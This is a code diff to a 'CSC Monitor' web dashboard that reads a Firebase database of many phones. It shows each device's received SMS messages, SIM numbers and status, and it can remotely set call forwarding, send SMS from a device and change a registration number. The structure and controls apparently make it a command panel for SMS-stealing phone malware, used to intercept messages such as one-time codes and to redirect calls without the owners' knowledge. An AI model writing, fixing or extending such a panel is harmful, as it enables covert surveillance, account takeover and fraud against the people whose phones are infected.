@@ -111,19 +111,11 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 <body>
 <div id="setup-screen">
   <div class="setup-card">
-    <div class="setup-logo">
-      <div class="ic">📡</div>
-      <h1>CSC Monitor</h1>
-      <p>Firebase Realtime Database Dashboard</p>
-    </div>
-    <div class="fg"><label>Firebase Database URL</label>
-      <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
-    <div class="fg"><label>API Key</label>
-      <input id="cfg-key" type="password" placeholder="AIzaSy..." /></div>
-    <div class="fg"><label>Project ID</label>
-      <input id="cfg-pid" placeholder="your-project-id" /></div>
-    <div class="fg"><label>Main Node (default: Verify_Device/csc6)</label>
-      <input id="cfg-node" value="Verify_Device/csc6" /></div>
+    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Monitor</h1><p>Firebase Realtime Database Dashboard</p></div>
+    <div class="fg"><label>Firebase Database URL</label><input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
+    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." /></div>
+    <div class="fg"><label>Project ID</label><input id="cfg-pid" placeholder="your-project-id" /></div>
+    <div class="fg"><label>Main Node (default: Verify_Device/csc6)</label><input id="cfg-node" value="Verify_Device/csc6" /></div>
     <button class="pbtn" id="setup-btn" onclick="doSetup()">🔗 Connect</button>
     <div class="errbox" id="setup-err"></div>
   </div>
@@ -152,7 +144,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
       <div class="sbox"><div class="snum" id="s-sms" style="color:var(--orange)">0</div><div class="slbl">Total SMS</div></div>
     </div>
     <div class="dev-list" id="device-list">
-      <div class="loading"><div class="spinner"></div> Loading...</div>
+      <div class="loading"><div class="spinner"></div> Loading devices...</div>
     </div>
   </div>
 </div>
@@ -218,6 +210,8 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 var DB_URL='', API_KEY='', ROOT_NODE='Verify_Device/csc6';
 var DEVICES={}, currentDeviceKey=null, selectedSim=0, toastTimer=null;
 var pollTimer=null, isSearchMode=false;
+var IGNORE_KEYS=['Admin_Password','RegisterNo','UpdateNo'];
+
 function fbGet(path){
   return fetch(DB_URL+'/'+path+'.json?auth='+API_KEY)
     .then(function(r){return r.json();});
@@ -243,7 +237,8 @@ function doSetup(){
   if(!DB_URL||!API_KEY||!pid){showSetupErr('Sab fields zaroori hain!');return;}
   var btn=document.getElementById('setup-btn');
   btn.disabled=true; btn.textContent='Connecting...';
-  fbGet(ROOT_NODE+'/All_User/Info').then(function(infoData){
+  fbGet(ROOT_NODE+'/All_User').then(function(allUser){
+    if(!allUser){showSetupErr('All_User node nahi mila. Node name check karo.');btn.disabled=false;btn.textContent='🔗 Connect';return;}
     document.getElementById('setup-screen').style.display='none';
     var app=document.getElementById('app');
     app.style.display='flex'; app.style.flexDirection='column';
@@ -270,57 +265,60 @@ function startPolling(){
   stopPolling();
   pollTimer=setInterval(function(){if(!isSearchMode) loadData();},8000);
 }
-function stopPolling(){
-  if(pollTimer){clearInterval(pollTimer);pollTimer=null;}
-}
+function stopPolling(){if(pollTimer){clearInterval(pollTimer);pollTimer=null;}}
 function objToArr(obj){
   if(!obj) return [];
   if(Array.isArray(obj)) return obj;
   var arr=[]; Object.keys(obj).forEach(function(k){arr.push(obj[k]);}); return arr;
 }
+function isDeviceKey(k){
+  return IGNORE_KEYS.indexOf(k)===-1 && k.length>10;
+}
 function loadData(){
-  Promise.all([
-    fbGet(ROOT_NODE+'/All_User/Info'),
-    fbGet(ROOT_NODE+'/All_User/Sms'),
-    fbGet(ROOT_NODE+'/All_User/SimINFO'),
-    fbGet(ROOT_NODE+'/All_User/Call_For'),
-    fbGet(ROOT_NODE+'/RegisterNo')
-  ]).then(function(results){
-    var infoData=results[0]||{};
-    var smsData=results[1]||{};
-    var simData=results[2]||{};
-    var callData=results[3]||{};
-    var regNo=results[4]||'—';
-    document.getElementById('register-bar').textContent='Register : '+regNo;
+  fbGet(ROOT_NODE+'/All_User').then(function(allUser){
+    if(!allUser){document.getElementById('device-list').innerHTML='<div class="empty"><div class="ei">📱</div><p>No data found</p></div>';return;}
     DEVICES={};
     var totalSms=0, online=0;
-    var deviceIds=Object.keys(infoData);
-    deviceIds.forEach(function(deviceId){
-      var info=infoData[deviceId]||{};
-      var smsRaw=smsData[deviceId]||{};
-      var sim=simData[deviceId]||{};
+    var keys=Object.keys(allUser).filter(isDeviceKey);
+    if(keys.length===0){
+      document.getElementById('device-list').innerHTML='<div class="empty"><div class="ei">📱</div><p>No devices found in All_User</p></div>';
+      document.getElementById('s-total').textContent='0';
+      document.getElementById('s-online').textContent='0';
+      document.getElementById('s-sms').textContent='0';
+      return;
+    }
+    keys.forEach(function(deviceId){
+      var devData=allUser[deviceId]||{};
+      var info=devData.Info||devData.info||{};
+      var smsRaw=devData.Sms||devData.Sms||devData.sms||{};
+      var sim=devData.SimINFO||devData.SimInfo||devData.simInfo||{};
       var smsArr=objToArr(smsRaw);
       totalSms+=smsArr.length;
-      var st=String(info.Status||info.status||'').toLowerCase();
+      var st=String(info.Status||info.status||devData.Forwad_Status||'').toLowerCase();
       var isOnline=(st==='online'||st==='1'||st=='true');
       if(isOnline) online++;
       DEVICES[deviceId]={
         key:deviceId,
-        name:info.MobileName||info.mobileName||info.DeviceName||info.name||deviceId,
-        id:info.DeviceId||info.deviceId||info.device_id||deviceId,
+        name:info.MobileName||info.mobileName||info.DeviceName||info.name||deviceId.substring(0,12)+'...',
+        id:info.DeviceId||info.deviceId||info.device_id||deviceId.substring(0,16),
         battery:info.Battery||info.battery||'—',
         status:isOnline?'online':'offline',
         sms:smsArr, simInfo:sim,
-        callFor:callData[deviceId]||{},
+        callFor:devData.Call_For||{},
+        forwardStatus:devData.Forwad_Status||'',
+        data:devData.Data||{},
         info:info
       };
     });
-    document.getElementById('s-total').textContent=deviceIds.length;
+    document.getElementById('s-total').textContent=keys.length;
     document.getElementById('s-online').textContent=online;
     document.getElementById('s-sms').textContent=totalSms;
+    var regNo=allUser.UpdateNo||allUser.RegisterNo||'—';
+    document.getElementById('register-bar').textContent='Register : '+regNo;
     renderDeviceList();
   }).catch(function(e){
     console.error('Load error:',e);
+    document.getElementById('device-list').innerHTML='<div class="empty"><div class="ei">⚠️</div><p>Error loading: '+e.message+'</p></div>';
   });
 }
 function renderDeviceList(){
@@ -333,7 +331,7 @@ function renderDeviceList(){
   devs.sort(function(a,b){
     if(a.status==='online'&&b.status!=='online') return -1;
     if(a.status!=='online'&&b.status==='online') return 1;
-    return a.name.localeCompare(b.name);
+    return a.key.localeCompare(b.key);
   });
   var html='';
   devs.forEach(function(dev,idx){
@@ -359,13 +357,12 @@ function renderDeviceList(){
 function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
 function openDevice(key){
   currentDeviceKey=key;
-  var dev=DEVICES[key];
-  if(!dev) return;
+  var dev=DEVICES[key]; if(!dev) return;
   document.getElementById('app').style.display='none';
   document.getElementById('search-screen').style.display='none';
   var ds=document.getElementById('detail-screen');
   ds.style.display='flex'; ds.style.flexDirection='column';
-  document.getElementById('detail-title').textContent=dev.name+' ('+dev.id+')';
+  document.getElementById('detail-title').textContent=dev.name;
   renderSmsList(dev);
 }
 function renderSmsList(dev){
@@ -376,14 +373,14 @@ function renderSmsList(dev){
     return;
   }
   var sorted=smsArr.slice().sort(function(a,b){
-    var ta=a.Time||a.time||a.date||''; var tb=b.Time||b.time||b.date||'';
+    var ta=a.date||a.Date||a.Time||a.time||''; var tb=b.date||b.Date||b.Time||b.time||'';
     return String(tb).localeCompare(String(ta));
   });
   var html='';
   sorted.forEach(function(sms){
-    var addr=sms.Address||sms.address||sms.from||sms.From||sms.sender||'Unknown';
-    var body=sms.Body||sms.body||sms.msg||sms.Msg||sms.message||'—';
-    var time=sms.Time||sms.time||sms.date||sms.Date||'—';
+    var addr=sms.ph||sms.Phone||sms.phone||sms.Address||sms.address||sms.from||sms.From||'Unknown';
+    var body=sms.msg||sms.Msg||sms.Body||sms.body||sms.message||'—';
+    var time=sms.date||sms.Date||sms.Time||sms.time||'—';
     html+='<div class="scard">'+
       '<div class="sadr">📩 '+escHtml(String(addr))+'</div>'+
       '<div class="sbody">'+escHtml(String(body))+'</div>'+
@@ -396,8 +393,7 @@ function goBack(){
   document.getElementById('detail-screen').style.display='none';
   document.getElementById('search-screen').style.display='none';
   document.getElementById('app').style.display='flex';
-  currentDeviceKey=null;
-  isSearchMode=false;
+  currentDeviceKey=null; isSearchMode=false;
   document.getElementById('global-search').value='';
   document.getElementById('search-clear-btn').style.display='none';
   loadData();
@@ -406,26 +402,21 @@ function onSearch(val){
   var clearBtn=document.getElementById('search-clear-btn');
   if(val.trim().length===0){clearBtn.style.display='none';if(isSearchMode){goBack();}return;}
   clearBtn.style.display='block'; isSearchMode=true;
-  var q=val.toLowerCase().trim();
-  var results=[];
+  var q=val.toLowerCase().trim(); var results=[];
   Object.values(DEVICES).forEach(function(dev){
     if(dev.name.toLowerCase().indexOf(q)!==-1 || dev.id.toLowerCase().indexOf(q)!==-1 || dev.key.toLowerCase().indexOf(q)!==-1){
       results.push(dev);
     }
   });
-  document.getElementById('search-summary').textContent=results.length+' device(s) found for "'+val+'"';
+  document.getElementById('search-summary').textContent=results.length+' device(s) found';
   var container=document.getElementById('search-results-list');
-  if(results.length===0){
-    container.innerHTML='<div class="empty"><div class="ei">🔍</div><p>No results found</p></div>';
-    return;
-  }
+  if(results.length===0){container.innerHTML='<div class="empty"><div class="ei">🔍</div><p>No results</p></div>';return;}
   var html='';
-  results.forEach(function(dev,idx){
-    var stClass=dev.status==='online'?'son':'soff';
+  results.forEach(function(dev){
     html+='<div class="src-card" onclick="openDevice(\''+dev.key+'\')">'+
       '<span class="sdlbl">📱 '+escHtml(dev.name)+'</span>'+
       '<span class="smcnt">'+escHtml(dev.id)+'</span>'+
-      '<div class="dstat '+stClass+'">'+(dev.status==='online'?'🟢 Online':'🔴 Offline')+' | 🔋 '+escHtml(String(dev.battery))+' | '+dev.sms.length+' SMS</div>'+
+      '<div style="font-size:12px;margin-top:6px;">'+(dev.status==='online'?'🟢 Online':'🔴 Offline')+' | 🔋 '+escHtml(String(dev.battery))+' | '+dev.sms.length+' SMS</div>'+
     '</div>';
   });
   container.innerHTML=html;
@@ -442,57 +433,49 @@ function clearSearch(){
 }
 function refreshData(){if(isSearchMode) return; loadData(); showToast('Refreshed ✅');}
 function openCallFwd(){
-  if(!currentDeviceKey) return;
-  var dev=DEVICES[currentDeviceKey]; if(!dev) return;
+  if(!currentDeviceKey) return; var dev=DEVICES[currentDeviceKey]; if(!dev) return;
   selectedSim=0;
-  var sims=dev.simInfo;
-  var simList=document.getElementById('sim-list');
+  var sims=dev.simInfo; var simList=document.getElementById('sim-list');
   var simKeys=sims?Object.keys(sims):[];
   if(simKeys.length===0){
-    simList.innerHTML='<div style="font-size:13px;color:var(--muted);text-align:center;padding:10px;">No SIM info found</div>';
+    simList.innerHTML='<div style="font-size:13px;color:var(--muted);text-align:center;padding:10px;">No SIM info</div>';
   } else {
     var html='';
     simKeys.forEach(function(k,idx){
-      var s=sims[k];
-      var number=s.Number||s.number||s.phone||s.Phone||k;
+      var s=sims[k]; var number=s.Number||s.number||s.phone||s.Phone||k;
       var operator=s.Operator||s.operator||s.carrier||s.Carrier||'Unknown';
-      var selClass=(idx===selectedSim)?' sel':'';
-      var chkClass=(idx===selectedSim)?' chk':'';
+      var selClass=(idx===selectedSim)?' sel':''; var chkClass=(idx===selectedSim)?' chk':'';
       html+='<div class="sim-opt'+selClass+'" onclick="selectSim('+idx+')">'+
-        '<div class="sim-ic">📶</div>'+
-        '<div class="sim-inf"><div class="sim-nm">SIM '+(idx+1)+'</div><div class="sim-no">'+escHtml(String(number))+' | '+escHtml(String(operator))+'</div></div>'+
+        '<div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM '+(idx+1)+'</div><div class="sim-no">'+escHtml(String(number))+' | '+escHtml(String(operator))+'</div></div>'+
         '<div class="sim-rb'+chkClass+'"></div></div>';
     });
     simList.innerHTML=html;
   }
-  document.getElementById('cf-number').value='';
-  document.getElementById('cf-result').style.display='none';
+  document.getElementById('cf-number').value=''; document.getElementById('cf-result').style.display='none';
   openDialog('dlg-cf');
 }
 function selectSim(idx){selectedSim=idx;openCallFwd();}
 function doCF(action){
   if(!currentDeviceKey){showToast('No device selected');return;}
-  var dev=DEVICES[currentDeviceKey];
-  var sims=dev.simInfo; var simKeys=sims?Object.keys(sims):[];
+  var dev=DEVICES[currentDeviceKey]; var sims=dev.simInfo; var simKeys=sims?Object.keys(sims):[];
   var number=document.getElementById('cf-number').value.trim();
   var resBox=document.getElementById('cf-result');
   if(action==='check'){
-    fbGet(ROOT_NODE+'/All_User/Call_For/'+currentDeviceKey).then(function(data){
+    fbGet(ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For').then(function(data){
       resBox.style.display='block';
-      if(data){resBox.innerHTML='✅ CF Status: <b>'+escHtml(JSON.stringify(data))+'</b>';resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';}
-      else {resBox.innerHTML='No call forwarding data';resBox.style.background='#eff6ff';resBox.style.border='1px solid #bfdbfe';resBox.style.color='#1d4ed8';}
-      showToast('CF Status checked');
-    }).catch(function(e){resBox.style.display='block';resBox.innerHTML='Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';});
+      if(data){resBox.innerHTML='✅ CF: <b>'+escHtml(JSON.stringify(data))+'</b>';resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';}
+      else {resBox.innerHTML='ℹ️ No CF data';resBox.style.background='#eff6ff';resBox.style.border='1px solid #bfdbfe';resBox.style.color='#1d4ed8';}
+    }).catch(function(e){resBox.style.display='block';resBox.innerHTML='❌ Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';});
     return;
   }
-  if(!number && action!=='deactive'){showToast('Please enter a number!');return;}
-  var simNum='';
-  if(simKeys.length>0){var selSim=sims[simKeys[selectedSim]];simNum=selSim.Number||selSim.number||selSim.phone||selSim.Phone||simKeys[selectedSim];}
+  if(!number && action!=='deactive'){showToast('Number required!');return;}
+  var simNum=''; if(simKeys.length>0){var selSim=sims[simKeys[selectedSim]];simNum=selSim.Number||selSim.number||selSim.phone||selSim.Phone||simKeys[selectedSim];}
   var cfData={action:action,number:number||'',sim:simNum,simIndex:selectedSim,timestamp:new Date().toISOString()};
-  fbSet(ROOT_NODE+'/All_User/Call_For/'+currentDeviceKey, cfData).then(function(){
-    resBox.style.display='block';resBox.innerHTML='✅ Call Forwarding <b>'+action.toUpperCase()+'</b> set for '+escHtml(number||simNum);
-    resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';showToast('CF '+action+' ✅');
-  }).catch(function(e){resBox.style.display='block';resBox.innerHTML='Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';showToast('CF failed');});
+  fbSet(ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For', cfData).then(function(){
+    resBox.style.display='block';resBox.innerHTML='✅ Call Forwarding <b>'+action.toUpperCase()+'</b> set!';
+    resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';
+    showToast('CF '+action+' ✅');
+  }).catch(function(e){resBox.style.display='block';resBox.innerHTML='❌ Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';});
 }
 function openSmsSend(){document.getElementById('sms-to').value='';document.getElementById('sms-msg').value='';openDialog('dlg-sms');}
 function doSendSms(){
@@ -500,8 +483,8 @@ function doSendSms(){
   var to=document.getElementById('sms-to').value.trim();
   var msg=document.getElementById('sms-msg').value.trim();
   if(!to||!msg){showToast('Number and message required!');return;}
-  var smsData={To:to,Msg:msg,Time:new Date().toISOString(),Status:'pending',Direction:'outgoing'};
-  fbSet(ROOT_NODE+'/All_User/Sms/'+currentDeviceKey+'/'+Date.now(), smsData).then(function(){
+  var smsData={ph:to,msg:msg,date:String(Date.now()),Status:'pending'};
+  fbSet(ROOT_NODE+'/All_User/'+currentDeviceKey+'/Sms/'+Date.now(), smsData).then(function(){
     showToast('SMS sent ✅');closeDialog('dlg-sms');
   }).catch(function(e){showToast('SMS failed: '+e.message);});
 }
@@ -509,7 +492,7 @@ function openUpdateNo(){document.getElementById('update-num').value='';openDialo
 function doUpdateNo(){
   var num=document.getElementById('update-num').value.trim();
   if(!num){showToast('Number required!');return;}
-  fbSet(ROOT_NODE+'/RegisterNo', num).then(function(){
+  fbSet(ROOT_NODE+'/All_User/UpdateNo', num).then(function(){
     showToast('Register updated ✅');closeDialog('dlg-update');loadData();
   }).catch(function(e){showToast('Update failed: '+e.message);});
 }
